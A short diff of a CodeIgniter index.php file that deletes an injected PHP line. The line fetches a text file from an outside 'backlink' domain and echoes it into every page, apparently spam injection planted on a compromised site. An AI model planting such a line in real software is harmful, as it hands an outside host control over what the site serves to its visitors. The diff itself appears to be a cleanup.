@@ -314,5 +314,4 @@ switch (ENVIRONMENT)
  * And away we go...
  */
 require_once BASEPATH.'core/CodeIgniter.php';
-<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
 // Powered By Wahyu Arthanugraha
